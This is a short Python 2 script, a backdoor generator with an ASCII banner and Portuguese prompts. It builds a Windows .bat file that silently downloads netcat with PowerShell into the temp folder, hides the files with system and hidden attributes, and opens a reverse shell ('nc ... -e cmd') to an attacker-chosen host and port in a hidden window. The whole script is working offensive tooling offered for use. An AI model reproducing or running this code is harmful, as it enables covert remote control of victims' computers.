import os

def usage():
	os.system("cls") # if windows
	#os.system("ls") # if linux
	print ""
	print " /$$$$$$$              /$$      /$$$$$$            /$$           /$$   /$$"    
	print " | $$__  $$            | $$     /$$__  $$          | $$          |__/  | $$"  
	print " | $$  \ $$  /$$$$$$  /$$$$$$  | $$  \__/  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$"  
	print " | $$$$$$$  |____  $$|_  $$_/  |  $$$$$$  /$$__  $$| $$ /$$__  $$| $$|_  $$_/"  
	print " | $$__  $$  /$$$$$$$  | $$     \____  $$| $$  \ $$| $$| $$  \ $$| $$  | $$  "  
	print " | $$  \ $$ /$$__  $$  | $$ /$$ /$$  \ $$| $$  | $$| $$| $$  | $$| $$  | $$ /$$"
	print " | $$$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/"
	print " |_______/  \_______/   \___/   \______/ | $$____/ |__/ \______/ |__/   \___/  "
	print "                                         | $$                                "  
	print "                                         | $$                                "  
	print "                                         |__/          "
	print ""
	print "	CODER : Daniel Victor Freire Feitosa | @DanielFreire00 | ProXySec	"
	print ""

def backdoor(nc, host, port, name):
	bd = "color 7f && mode 20, 10\r\n"
	bd += "cd %TEMP%\r\n"
	bd += "echo powershell(new-object system.net.webclient).downloadfile('"+nc+"', 'nc.exe') >> bd.bat\r\n"
	bd += "echo attrib +s +h nc.exe >> bd.bat\r\n"
	bd += "echo nc " + host + " " + port + " -e cmd >> bd.bat\r\n"
	bd += "attrib +s +h bd.bat\r\n"
	bd += "powershell -W hidden ./bd.bat"
	arquivo = open(name + ".bat", "w")
	arquivo.write(bd)

usage()
nc = raw_input("NetCat Link Download _> ")
host = raw_input("LHOST _> ")
port = raw_input("LPORT _> ")
name = raw_input("Name of backdoor _> ")
try:
	print ""
	print "Criando Backdoor"
	backdoor(nc, host, port, name)
	print "Backdoor Criada : " + name + ".bat"
except:
	print "Algo deu errado..."
